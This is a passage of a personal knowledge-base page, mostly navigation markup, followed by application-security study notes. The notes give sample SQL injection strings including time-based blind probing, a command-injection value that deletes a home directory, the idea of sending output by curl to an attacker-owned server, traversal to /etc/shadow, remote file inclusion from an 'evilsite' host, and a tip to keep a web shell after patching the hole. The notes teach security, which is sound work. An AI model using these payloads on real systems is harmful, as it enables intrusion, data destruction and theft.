+    <a href="/cybersecurity/monitoring-and-incident-response/" class="">Monitoring and Incident Response</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/network-security/" class="">Network Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/password-attacks/" class="">Password Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/privacy/" class="">Privacy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/resilience-and-physical-security/" class="">Resilience and Physical Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/resources/" class="">Resources</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/risk-management/" class="">Risk Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/security-assesment-and-testing/" class="">Security Assesment and Testing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/security-governance-and-compliance/" class="">Security Governance and Compliance</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/social-engineering/" class="">Social Engineering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/threat-landscape/" class="">Threat Landscape</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/wireless-and-mobile-security/" class="">Wireless and Mobile Security</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-81aaadc4a6f20468960704bb65527a83" class="toggle"  />
+    <label for="section-81aaadc4a6f20468960704bb65527a83" class="flex">
+      <a href="/data-struct-algo/" class="flex-auto ">Data Struct Algo</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/binary-search/" class="">Binary Search</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/bubble-sort/" class="">Bubble Sort</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/graph/" class="">Graph</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/insertion-sort/" class="">Insertion Sort</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/linear-search/" class="">Linear Search</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/quick-sort/" class="">Quick Sort</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/algorithms/selection-sort/" class="">Selection Sort</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/big-o/" class="">Big O</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/array/" class="">Array</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/binary-tree/" class="">Binary Tree</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/doubly-linked-list/" class="">Doubly Linked List</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/hash-table/" class="">Hash Table</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/queue/" class="">Queue</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/singly-linked-list/" class="">Singly Linked List</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/data-structures/stack/" class="">Stack</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/data-struct-algo/np-completeness/" class="">Np Completeness</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fcae99f4a8081f912981f762656a25ff" class="toggle"  />
+    <label for="section-fcae99f4a8081f912981f762656a25ff" class="flex">
+      <a href="/facilitation/" class="flex-auto ">Facilitation</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-9e5944f94d761042e0ce48d8bafd1fe7" class="toggle"  />
+    <label for="section-9e5944f94d761042e0ce48d8bafd1fe7" class="flex">
+      <a href="/it-strategy/" class="flex-auto ">It Strategy</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4675e4e30643ddab2c70afb6a2ca02cd" class="toggle"  />
+    <label for="section-4675e4e30643ddab2c70afb6a2ca02cd" class="flex">
+      <a href="/it-strategy/platform-strategy/" class="flex-auto ">Platform Strategy</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c047fd11269da2900c28f007bda5710a" class="toggle"  />
+    <label for="section-c047fd11269da2900c28f007bda5710a" class="flex">
+      <a href="/linux-lpic-1/" class="flex-auto ">Linux Lpic 1</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-52ffa23bb23b30d5ed484dfdc90b025b" class="toggle"  />
+    <label for="section-52ffa23bb23b30d5ed484dfdc90b025b" class="flex">
+      <a href="/network/" class="flex-auto ">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-176491d6c50133f2ea87ec589d93b052" class="toggle"  />
+    <label for="section-176491d6c50133f2ea87ec589d93b052" class="flex">
+      <a href="/nodejs-streams-and-networking/" class="flex-auto ">Nodejs Streams and Networking</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-48b0ad26c635429f5ec6d8e1af19804e" class="toggle"  />
+    <label for="section-48b0ad26c635429f5ec6d8e1af19804e" class="flex">
+      <a href="/osint/" class="flex-auto ">Osint</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-df27f5a34fae3862434b3bd6fdc7d575" class="toggle"  />
+    <label for="section-df27f5a34fae3862434b3bd6fdc7d575" class="flex">
+      <a href="/productivity/" class="flex-auto ">Productivity</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a57856b2920a2fb9388743881d6f6077" class="toggle"  />
+    <label for="section-a57856b2920a2fb9388743881d6f6077" class="flex">
+      <a href="/project-management/" class="flex-auto ">Project Management</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5814dfcac8f9100c4091e4248b532eda" class="toggle"  />
+    <label for="section-5814dfcac8f9100c4091e4248b532eda" class="flex">
+      <a href="/psychology/" class="flex-auto ">Psychology</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5fbfe8b07d702e3dd1510f4f3100c046" class="toggle"  />
+    <label for="section-5fbfe8b07d702e3dd1510f4f3100c046" class="flex">
+      <a href="/reasoning/" class="flex-auto ">Reasoning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-caff6580ca16ac21759b6786a0c456d8" class="toggle"  />
+    <label for="section-caff6580ca16ac21759b6786a0c456d8" class="flex">
+      <a href="/software-architecture/" class="flex-auto ">Software Architecture</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/application-architecture/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-characteristics/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/ball-of-mud/" class="">Ball of Mud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/event-driven/" class="">Event Driven</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/layered/" class="">Layered</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/microkernel/" class="">Microkernel</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/microservices/" class="">Microservices</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/orchestration-driven-service-oriented/" class="">Orchestration Driven Service Oriented</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/pipeline/" class="">Pipeline</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/service-based/" class="">Service Based</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/architecture-styles/space-based/" class="">Space Based</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/blog-ideas/" class="">Blog Ideas</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/data-architecture/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/integration-architecture/events/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/integration-architecture/events/versioning/" class="">Versioning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/integration-architecture/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/nuggets-of-wisdom/" class="">Nuggets of Wisdom</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/resources/" class="">Resources</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/thought-leaders/" class="">Thought Leaders</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/todo/" class="">Todo</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/anti-patterns/" class="">Anti Patterns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/architectural-thinking/" class="">Architectural Thinking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/architecture-decisions/" class="">Architecture Decisions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/architecture-risk/" class="">Architecture Risk</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/best-practices/" class="">Best Practices</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/clean-architecture/" class="">Clean Architecture</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/components/" class="">Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/conway-law/" class="">Conway Law</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/design-principles/" class="">Design Principles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/diagrams-and-presentations/" class="">Diagrams and Presentations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/domain-driven-design/" class="">Domain Driven Design</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/evolutionary-architecture/" class="">Evolutionary Architecture</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/feature-toggles/" class="">Feature Toggles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/how-to-do/" class="">How to Do</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/laws-of-software-architecture/" class="">Laws of Software Architecture</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/make-effective-teams/" class="">Make Effective Teams</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/modules/" class="">Modules</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/negotiation-and-leadership-skills/" class="">Negotiation and Leadership Skills</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/software-architect-role/" class="">Software Architect Role</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/systems-thinking/" class="">Systems Thinking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/team-topologies/" class="">Team Topologies</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-architecture/topics/threat-modeling/" class="">Threat Modeling</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ddaebde9223642f47760ee015a7ddd45" class="toggle"  />
+    <label for="section-ddaebde9223642f47760ee015a7ddd45" class="flex">
+      <a href="/software-design/" class="flex-auto ">Software Design</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a60f54537a5317a75e05ed7401bead6e" class="toggle"  />
+    <label for="section-a60f54537a5317a75e05ed7401bead6e" class="flex">
+      <a href="/software-development-process/" class="flex-auto ">Software Development Process</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/software-development-process/internal-open-source/" class="">Internal Open Source</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ecb6eb749f789ef8ddd00db573f4f2af" class="toggle"  />
+    <label for="section-ecb6eb749f789ef8ddd00db573f4f2af" class="flex">
+      <a href="/software-testing/" class="flex-auto ">Software Testing</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bc3d82c57976f22f86a1648d7874403c" class="toggle"  />
+    <label for="section-bc3d82c57976f22f86a1648d7874403c" class="flex">
+      <a href="/statistics/" class="flex-auto ">Statistics</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-66ae6fa4b7048361c96c02dfd54f33e8" class="toggle"  />
+    <label for="section-66ae6fa4b7048361c96c02dfd54f33e8" class="flex">
+      <a href="/usb-spec/" class="flex-auto ">USB Spec</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/usb-spec/terms_and_abbreviations/" class="">Terms and Abbreviations</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/wisdom/" class="">Wisdom</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <span>Ais</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/ai/readme/" class="">Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    
+    <a href="https://github.com/SegersIan/knowledge-base"  target="_blank" rel="noopener">
+        Github - Site
+      </a>
+  </li>
+  
+  <li>
+    
+    <a href="https://github.com/SegersIan"  target="_blank" rel="noopener">
+        Github - Profile
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Application Security</h3>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#software-assurance-best-practices">Software Assurance Best Practices</a></li>
+    <li><a href="#designing-and-coding-for-security">Designing and Coding For Security</a></li>
+    <li><a href="#software-security-testing">Software Security Testing</a></li>
+    <li><a href="#injection-vulnerabilitiies">Injection Vulnerabilitiies</a></li>
+    <li><a href="#exploiting-authentication-vulnerabilities">Exploiting Authentication Vulnerabilities</a></li>
+    <li><a href="#exploiting-authorization-vulnerabilities">Exploiting Authorization Vulnerabilities</a></li>
+    <li><a href="#exploiting-web-application-vulnerabilities">Exploiting Web Application Vulnerabilities</a></li>
+    <li><a href="#application-security-controls">Application Security Controls</a></li>
+    <li><a href="#secure-coding-practices">Secure Coding Practices</a></li>
+    <li><a href="#automation-and-orchestration">Automation and Orchestration</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="application-security">
+  Application Security
+  
+  <a class="anchor" href="#application-security">#</a>
+  
+</h1>
+<h2 id="software-assurance-best-practices">
+  Software Assurance Best Practices
+  
+  <a class="anchor" href="#software-assurance-best-practices">#</a>
+  
+</h2>
+<ul>
+<li><strong>The Software Development Lifecycle</strong>
+<ul>
+<li>Planning &gt; Requirements &gt; Design &gt; Coding &gt; Testing &gt; Training &amp; Transition &gt; Ongoing Ops/maintenance &gt; End Of Life (Decommission)</li>
+<li>dev env &gt; for devs</li>
+<li>test env &gt; QA/Preprod</li>
+<li>staging &gt; tested but awaiting deployment</li>
+<li>prod</li>
+</ul>
+</li>
+<li><strong>DevSecOps and DevOps</strong>
+<ul>
+<li>Sec becomes a shared responsibility, just like the Ops.</li>
+</ul>
+</li>
+</ul>
+<h2 id="designing-and-coding-for-security">
+  Designing and Coding For Security
+  
+  <a class="anchor" href="#designing-and-coding-for-security">#</a>
+  
+</h2>
+<ul>
+<li><strong>Secure Coding Practices</strong>
+<ul>
+<li>Open Worldwide Application Security Project (OWASP) - best resource for secure coding practices.</li>
+<li>Top Proactive Security Controls by OWASP
+<ul>
+<li>Define Security Requirements</li>
+<li>Leverage Security Frameworks</li>
+<li>Secure Database Access</li>
+<li>Encode an Escape Data</li>
+<li>Validate all inputs</li>
+<li>Implement DIgital Identity</li>
+<li>Enforce Access Controls</li>
+<li>Priotect Data Everywhere</li>
+<li>Implement Security Logging and Monitoring</li>
+<li>Handle all errors and exceptions</li>
+</ul>
+</li>
+<li><a href="https://top10proactive.owasp.org/">OWASP Proactive Controls</a></li>
+<li><a href="https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/">OWASP Quick Reference</a></li>
+</ul>
+</li>
+<li><strong>API Security</strong>
+<ul>
+<li><a href="https://owasp.org/www-project-api-security/">OWASP API Security</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="software-security-testing">
+  Software Security Testing
+  
+  <a class="anchor" href="#software-security-testing">#</a>
+  
+</h2>
+<ul>
+<li><a href="https://www.veracode.com/resources/analyst-reports/state-of-software-security-2025/">State Of Software Security Report</a></li>
+<li><strong>Analyzing and Testing Code</strong>
+<ul>
+<li>Static Code Analysis - reads the actual code to find flaws in it</li>
+<li>Dynamic Code Analysis - runs the code to find flaws in it</li>
+<li>Fuzzing - send random data to application to see how it handles unexpected data</li>
+</ul>
+</li>
+</ul>
+<h2 id="injection-vulnerabilitiies">
+  Injection Vulnerabilitiies
+  
+  <a class="anchor" href="#injection-vulnerabilitiies">#</a>
+  
+</h2>
+<ul>
+<li><strong>SQL Injection Attacks</strong>
+<ul>
+<li>Is also a class under Code Injection attacks.</li>
+<li>Happens when User Input is directly used in a SQL Query
+<ul>
+<li>Query Used <code>SELECT * FROM Products WHERE Name LIKE '%user_input_value%'</code></li>
+<li>User Input <code>cola'; SELECT * FROM users; --</code> instead of just <code>cola</code></li>
+<li>Results in : <code>SELECT * FROM Products WHERE Name LIKE 'cola'; SELECT * FROM users; --</code>, so 2 SQL queries</li>
+<li>However, the results might not be returned/visible to the user, solution? <em>Blind SQL Injection</em></li>
+<li><strong>2 Blind SQL Injection Types</strong>
+<ul>
+<li><em>Blind Content-Based SQL Injection</em>
+<ul>
+<li>First: Validate if SQL Injection is possible</li>
+<li>Asume we expect an UserID as User input, and let&rsquo;s assume <code>123</code> is a vailid UserID.</li>
+<li>Query Used <code>SELECT * FROM Users WHERE Id = '%user_input_value%'</code></li>
+<li>Specify <code>123' OR 1=1</code> which results in <code>SELECT * FROM Users WHERE Id = '123' OR 1=1</code></li>
+<li>This returns multiple rows, did it break anything on the front end? No ? Good ✅
+<ul>
+<li>You might not see the multiple rows due to business logic,but it DID EXECUTE properly (you get feedback that the query was valid)</li>
+</ul>
+</li>
+<li>Now specify <code>123' OR 1=2</code> which results in <code>SELECT * FROM Users WHERE Id = '123' OR 1=2</code></li>
+<li>This returns no row, did it break anything on the front end aside of just saying that there were no results? Yes ? Good ✅</li>
+<li>We can now asume that SQL injection is possible.</li>
+<li><em><strong>Now you can inject other querys that ALTER data. The baseline feedback if it was succesful or not your query is established in previous steps. Based on the <em>CONTENT</em> you were able to validate if your queries are working</strong></em></li>
+</ul>
+</li>
+<li><em>Blind Time-Based SQL Injection</em> - (example in Microsoft SQL)
+<ul>
+<li>First: Validate if SQL Injection is possible</li>
+<li>Asume we expect an UserID as User input, and let&rsquo;s assume <code>123</code> is a vailid UserID.</li>
+<li>Specify <code>123'; WAITFOR DELAY '00:00:15'</code> which results in <code>SELECT * FROM Users WHERE Id = '123'; WAITFOR DELAY '00:00:15'</code></li>
+<li>If the query now takes 15 seconds to execute, we can be quite confident that the SQL injection is possible. ✅.</li>
+<li>⚠️ Now this &ldquo;timer&rdquo; trick, can be also used to signal back if something was &rsquo;true&rsquo; (if true, wait 15 seconds, else not).
+<ul>
+<li>An example, assuming the password is cleartext</li>
+</ul>
+<pre tabindex="0"><code>  For each character in the password
+    For each letter in the alphabet
+      if the current character is equal to the current letter, wait 15 seconds before returning results
+</code></pre></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Code Injection Attacks</strong>
+<ul>
+<li>Examples
+<ul>
+<li>LDAP Injection Attack - Embed commands in text as part of a LDAP query</li>
+<li>XML Injection Attack - Embed code in XML text</li>
+<li>DLL Injection Attack - Force an application to load a (malicious) DLL that was not a part of the process.</li>
+<li>Cross-Site-Scripting (XSS)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Command Injection Attacks</strong>
+<ul>
+<li>When an application executes a command against the OS, there is a potential for exploitation.</li>
+<li>Example
+<ul>
+<li>You have a webpage to create a user and the end user must specify a username in a form</li>
+<li>On creation, the app might run a command to create a folder for that new user <code>system('mkdir /home/students/&lt;mynewusername&gt;</code>)</li>
+<li>What if the user specifies <code>mynewusername &amp;&amp; rm -rf home</code></li>
+<li>Now we have piped again additional commands</li>
+<li>⚠️ Note that there is again no feedback/response, but you could try to have a script use a time or a <code>curl</code> command to post back the output to a webserver you own.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploiting-authentication-vulnerabilities">
+  Exploiting Authentication Vulnerabilities
+  
+  <a class="anchor" href="#exploiting-authentication-vulnerabilities">#</a>
+  
+</h2>
+<ul>
+<li><strong>Password Authentication</strong>
+<ul>
+<li>Flaw: Once an attacher knows a password, they can keep using it for access.</li>
+<li>Risk: Social Engineering, unencrypted traffic, password dumps from hacked sites, brute force, guessing</li>
+</ul>
+</li>
+<li><strong>Session Attacks</strong>
+<ul>
+<li><em>Cookie Stealing &amp; Manipulation</em>
+<ul>
+<li>Steal an existing (authentication) session</li>
+<li>After auth, the session token is stored in browser cookie for further request auth</li>
+<li>How to steal it?
+<ul>
+<li>Unencrypted network traffic</li>
+<li>Malware in browser</li>
+<li>On Path attack - Impersonate target site, forward the actual credentials to target site, return the request to the user with the cookie, but now you also have that cookie. (But you know then the credentials either way?)</li>
+</ul>
+</li>
+<li>Once you have the cookie
+<ul>
+<li>Session Replay Attack - The attacker reuses the session of the target</li>
+</ul>
+</li>
+<li>Defenses
+<ul>
+<li>Mark Cookie <code>SECURE</code> - tells the browser to never send it over unencrypted requests</li>
+</ul>
+</li>
+<li>NTLM pass-the-hash
+<ul>
+<li>NTLM hash is the hash function in windows to store user&rsquo;s passwords.</li>
+<li>So if you can intercept this hash, instead of the username/password, you can also authenticate in/with windows.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><em>Unvalidated Redirects</em>
+<ul>
+<li>Example: <code>example.com/order?redirect_ok=https://evilsite.com</code> and then the evil site can impersonate and ask to re authenticate again or whaterver</li>
+<li>Example: <code>example.com/login?login_ok=https://evilsite.com</code>, then after login it might call <code>https://evilsite.com?csrf_token=&lt;somevalue&gt;</code> or the <code>Referer: https://bank.com/transfer?sessionid=abc123&amp;csrf_token=xyz789</code> header</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploiting-authorization-vulnerabilities">
+  Exploiting Authorization Vulnerabilities
+  
+  <a class="anchor" href="#exploiting-authorization-vulnerabilities">#</a>
+  
+</h2>
+<ul>
+<li><strong>Insecure Direct Object References</strong>
+<ul>
+<li><code>example.com/orders?id=100</code> shows your order and you can just do <code>example.com/orders?id=101</code> and see anothers order.</li>
+</ul>
+</li>
+<li><strong>Directory Traversal</strong>
+<ul>
+<li>The web server allows to navigate the directory and list all files - bad configuration
+<ul>
+<li>Appache Server / NGINX - <code>www.example.com/../../../etc/shawdow</code> (so you just path yourself outside the web folder)</li>
+<li>Open AWS S3 bucket</li>
+<li>It helps to know on what server the site is host to then learn about their (Default) config</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>File Inclusion</strong>
+<ul>
+<li>Next level Directory Traversel - you don&rsquo;t just read a file, you execute it</li>
+<li>Run a file from the server&rsquo;s file system: <code>www.example.com/?include=../../../etc/attack.sh</code></li>
+<li>Run a file from an external place: <code>www.example.com/?include=www.evilsite.com/script.sh</code></li>
+<li>Attack might then upload a <a href="https://en.wikipedia.org/wiki/Web_shell">Web Shell</a> to comfortably run commands and see output
+<ul>
+<li>✅ The webshell uses HTTPS, so it hides even better.</li>
+</ul>
+</li>
+<li>TIP: Patch the vulnerability and persist your access with the web shell</li>
+</ul>
+</li>
+<li><strong>Privilege Escalation</strong>
+<ul>
+<li>Upgrade your user to have more rights or higher group</li>
+<li>Dirty Cow - Linux vulnerability</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploiting-web-application-vulnerabilities">
+  Exploiting Web Application Vulnerabilities
+  
